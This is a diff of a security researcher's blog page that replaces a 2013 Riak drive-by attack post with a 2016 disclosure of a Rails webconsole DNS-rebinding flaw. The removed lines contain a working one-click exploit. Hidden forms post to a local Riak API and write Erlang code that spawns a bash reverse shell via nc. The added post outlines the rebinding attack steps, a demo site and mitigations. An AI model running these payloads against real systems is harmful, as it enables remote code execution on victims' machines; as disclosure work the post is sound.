@@ -5,11 +5,11 @@
 <!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
 <head>
   <meta charset="utf-8">
-  <title>Riak Drive by Attack - Ben's Blog</title>
+  <title>Rails Webconsole DNS Rebinding - Ben's Blog</title>
   <meta name="author" content="Ben Murphy">
 
   
-  <meta name="description" content="Be careful with Riak HTTP API (CVE-2012-3586) This has been fixed in Riak 1.1.4 I would recommend not running the Riak HTTP API on a machine that you &hellip;">
+  <meta name="description" content="The webconsole gem which ships with the Rails development server allows remote code execution via DNS Rebinding. I reported this issue to Rails on &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -18,7 +18,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1">
 
   
-  <link rel="canonical" href="http://benmmurphy.github.com/blog/2013/09/01/riak-drive-by-attack">
+  <link rel="canonical" href="http://benmmurphy.github.com/blog/2016/07/11/rails-webconsole-dns-rebinding">
   <link href="/favicon.png" rel="icon">
   <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
   <script src="/javascripts/modernizr-2.0.js"></script>
@@ -79,7 +79,7 @@
   
   <header>
     
-      <h1 class="entry-title">Riak Drive by Attack</h1>
+      <h1 class="entry-title">Rails Webconsole DNS Rebinding</h1>
     
     
       <p class="meta">
@@ -95,92 +95,52 @@
   
 
 
-<time datetime="2013-09-01T21:29:00+01:00" pubdate data-updated="true"></time>
+<time datetime="2016-07-11T09:00:00+01:00" pubdate data-updated="true"></time>
         
       </p>
     
   </header>
 
 
-<div class="entry-content"><h2>Be careful with Riak HTTP API (CVE-2012-3586)</h2>
+<div class="entry-content"><p>The webconsole gem which ships with the Rails development server allows remote code execution via DNS Rebinding. I reported this issue to Rails on April 20th 2015. However, it may have been reported to them earlier because Homakov also found the issue independently and tweeted about it here:</p>
 
-<p>This has been fixed in <a href="http://lists.basho.com/pipermail/riak-users_lists.basho.com/2012-June/008635.html">Riak 1.1.4</a></p>
+<div class='embed tweet'><blockquote class="twitter-tweet"><p lang="en" dir="ltr">There are lots of dangerous interactions with localhost: I tweeted that with DNS rebinding we can RCE via REPL on any Rails app, no fix yet</p>&mdash; Egor Homakov (@homakov) <a href="https://twitter.com/homakov/status/686670899081273346">January 11, 2016</a></blockquote>
+<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script></div>
 
-<p>I would recommend not running the Riak HTTP API on a machine that you browse the internet on or on a machine that is reachable by machines that can browse the internet.</p>
 
-<p>This is heavily based on <a href="http://aphyr.com/posts/224-do-not-expose-riak-directly-to-the-internet">Aphyr’s work</a>. I’ve taken his work and used it in a cross site scripting attack. When you click the attack me button your riak process will attempt to connect to localhost:6666. If you run nc -l 6666 and wait for a connection you will have a shell with the privileges of the user running riak.</p>
+<p>Since this issue is semi-public I think it is better that the problem is made public before waiting for a fix that may never appear. It also important to note that many developer set ups are probably not vulnerable because they are using Pow to run Rails applications or their upstream DNS servers apply DNS rebinding protection.</p>
 
-<p>The attack will perform the following actions</p>
+<p>The problem is same origin policy in browsers is broken for IP based security unless the server checks the Host header is what it expects it to be. And it looks like rails development mode does not do any checking of the Host header to see that the header is 127.0.0.1 or localhost.</p>
+
+<p>The attack looks something like this:</p>
 
 <ol>
-<li>Write the value <code>lols=lols</code> to the <code>key i_can_run_better</code> in bucket <code>everything_you_can_run</code></li>
-<li>Write the value <code>spawn(fun() -&gt; os:cmd("mkfifo /tmp/mypipe.$$ &amp;&amp; cat /tmp/mypipe.$$ | /bin/bash -i 2&gt;&amp;1 | nc localhost 6666 &gt; /tmp/mypipe.$$") end)</code> to the file <code>/tmp/evil.erl</code></li>
-<li>Evalute the contents of <code>/tmp/evil.erl</code> using the erlang function <code>file:path_eval</code>. This will cause your machine to try and open a connection to localhost:6666 that is backed by a shell running under the riak user.</li>
+<li>Attacker tricks user into going to a website they control. For example reallycoolflashgame.com (nothing looks suspicious..)</li>
+<li>Attacker opens an iframe to sdjhskdf87.reallycoolflashgame.com:3000 (SOP policy is based on the port number and we open this in an iframe so we don&rsquo;t tip off the user that something suspicious is going on)</li>
+<li>sdjhskdf87.reallycoolflashgame.com is a DNS record with a really short TTL. For example 60 seconds. Attacker then changes the DNS record to point from their IP address to 127.0.0.1</li>
+<li>The original html page at sdjhskdf87.reallycoolflashgame.com:3000 starts making XHR requests after the TTL has expired. These requests get routed to the rails app and they can trigger the debug functionality remotely.</li>
 </ol>
 
 
-<p>By clicking ‘Hack Me’ you agree that you have reviewed the source code of this page and understand what the attack will do and will not hold the author of this page liable for any damage the attack may cause.</p>
+<p>I have a website that simulates this attack. If you visit this website on OSX and it starts the Calculator.app then you are definitely vulnerable. However, if it does not work then that might be because the attack is buggy and is not proof that you don&rsquo;t have a vulnerable setup.</p>
 
-<p>Click ‘Hack Me’ below to start the attack.</p>
-
-<iframe id='insert_record_frame' name='insert_record_frame' style='display:none;width:0px;height:0px'></iframe>
-
-
-
-
-<p><form action='http://localhost:8098/riak/everything_you_can_run/i_can_run_better' id='insert_record_form' method='POST' target='insert_record_frame'>
-  <input name='lols' type='hidden' value='lols' />
-</form></p>
+<ol>
+<li>create a new rails project with rails new demo</li>
+<li>cd demo; rails server</li>
+<li>go to <a href="http://www.dnsrebinder.net/">http://www.dnsrebinder.net/</a> in your browser -> you will be asked to enter username/password which is rebinder:1FLkAavKIRADAhDs1t6UuQ . You will need to do this twice. Obviously, in a real scenario it won&rsquo;t require this user interaction.</li>
+<li>You will have to wait about 60-80 seconds and if you are running OSX it will pop a calculator. If you are running something else it won&rsquo;t do anything useful :(. You can monitor what is happening in Chrome Developer tools. If you see a request that generates a 404 this is evidence that the DNS rebinding was successful.</li>
+</ol>
 
 
+<p>It might not work if your router or upstream DNS provider is filtering private ip ranges in DNS lookups. So you might have to set your DNS server to point to 8.8.8.8 (google DNS).</p>
 
+<h2>Mitigations</h2>
 
-<iframe id='write_file' name='write_file' style='display:none;width:0px;height:0px'></iframe>
-
-
-
-
-<p><form action='http://localhost:8098/mapred' enctype='text/plain' id='write_file_form' method='POST' target='write_file'>
-  <input name='{"lolkey' type='hidden' value='":"bar","inputs":[["everything_you_can_run","i_can_run_better"]],"query":[{"map":{"language":"javascript","source":"function(v) {return [47,116,109,112,47,101,118,105,108,46,101,114,108];}"}},{"reduce":{"language":"erlang","module":"file","function":"write_file","arg":"spawn(fun() -&gt; os:cmd(\"mkfifo /tmp/mypipe.$$  &amp;&amp; cat /tmp/mypipe.$$ | /bin/bash -i 2&gt;&amp;1 | nc localhost 6666 &gt; /tmp/mypipe.$$\") end)."}}]}' />
-</form></p>
-
-
-
-
-<iframe id='evaluate_file' name='evaluate_file' style='display:none;width:0px;height:0px'></iframe>
-
-
-
-
-<p><form action='http://localhost:8098/mapred' enctype='text/plain' id='evaluate_file_form' method='POST' target='evaluate_file'>
-  <input name='{"lolkey' type='hidden' value='":"bar","inputs":[["everything_you_can_run", "i_can_run_better"]], "query":[{"map":{"language":"javascript", "source":"function(v) {return [47,116,109,112,47,101,118,105,108,46,101,114,108];}"}}, {"reduce":{"language":"erlang", "module":"file", "function":"path_eval", "arg":"/tmp/evil.erl"}}]}' />
-</form>
-<input id='hack_me' type='button' value='Hack Me' /></p>
-
-
-
-
-<script type='text/javascript'>
-  //<![CDATA[
-    $("#hack_me").click(function() {
-        if (confirm("You agree that you have reviewed the source code of this page and understand what the attack will do and will not hold the author of this page liable for any damage the attack may cause. ")) {
-            $("#insert_record_form")[0].submit();
-            setTimeout(write_file, 1000);
-        }
-    });
-    
-    function write_file() {
-        $("#write_file_form")[0].submit();
-        setTimeout(evaluate_file, 1000);           
-    }
-    
-    function evaluate_file() {
-        $("#evaluate_file_form")[0].submit();          
-    }
-  //]]>
-</script>
-
-
+<ol>
+<li>Remove webconsole gem from your Gemfile.</li>
+<li>Use pow.cx which hosts your Rails application under the .dev domain namespace and do not spawn Rails applications using the &lsquo;rails server&rsquo; command.</li>
+<li>Use a DNS server that applies DNS rebinding filtering. It is important that it filters 127.0.0.0/8 and the IPV6 local addresses. In particular Rails5 Puma only binds to the IPV6 local address under OSX.</li>
+</ol>
 
 </div>
 
@@ -204,7 +164,7 @@
   
 
 
-<time datetime="2013-09-01T21:29:00+01:00" pubdate data-updated="true"></time>
+<time datetime="2016-07-11T09:00:00+01:00" pubdate data-updated="true"></time>
       
 
 
@@ -212,7 +172,7 @@
     
       <div class="sharing">
   
-  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://benmmurphy.github.com/blog/2013/09/01/riak-drive-by-attack/" data-via="benmmurphy" data-counturl="http://benmmurphy.github.com/blog/2013/09/01/riak-drive-by-attack/" >Tweet</a>
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://benmmurphy.github.com/blog/2016/07/11/rails-webconsole-dns-rebinding/" data-via="benmmurphy" data-counturl="http://benmmurphy.github.com/blog/2016/07/11/rails-webconsole-dns-rebinding/" >Tweet</a>
   
   
   <div class="g-plusone" data-size="medium"></div>
@@ -225,10 +185,8 @@
     
     <p class="meta">
       
-        <a class="basic-alignment left" href="/blog/2012/05/15/abusing-dynamic-types-for-fun-and-profit/" title="Previous Post: Abusing Dynamic Types For Fun And Profit">&laquo; Abusing Dynamic Types For Fun And Profit</a>
+        <a class="basic-alignment left" href="/blog/2015/11/09/zdi-13-XXX-java-sandbox-bypass-1-dot-7-0-10-slash-1-dot-6-0-38-via-proxy-and-jmx/" title="Previous Post: ZDI-13-XXX (2013) Java Sandbox Bypass (1.7.0_10) / (1.6.0_38) via Proxy and JMX">&laquo; ZDI-13-XXX (2013) Java Sandbox Bypass (1.7.0_10) / (1.6.0_38) via Proxy and JMX</a>
       
-      
-        <a class="basic-alignment right" href="/blog/2015/06/04/redis-eval-lua-sandbox-escape/" title="Next Post: Redis EVAL Lua Sandbox Escape">Redis EVAL Lua Sandbox Escape &raquo;</a>
       
     </p>
   </footer>
@@ -294,8 +252,8 @@
       
         
         // var disqus_developer = 1;
-        var disqus_identifier = 'http://benmmurphy.github.com/blog/2013/09/01/riak-drive-by-attack/';
-        var disqus_url = 'http://benmmurphy.github.com/blog/2013/09/01/riak-drive-by-attack/';
+        var disqus_identifier = 'http://benmmurphy.github.com/blog/2016/07/11/rails-webconsole-dns-rebinding/';
+        var disqus_url = 'http://benmmurphy.github.com/blog/2016/07/11/rails-webconsole-dns-rebinding/';
         var disqus_script = 'embed.js';
       
     (function () {
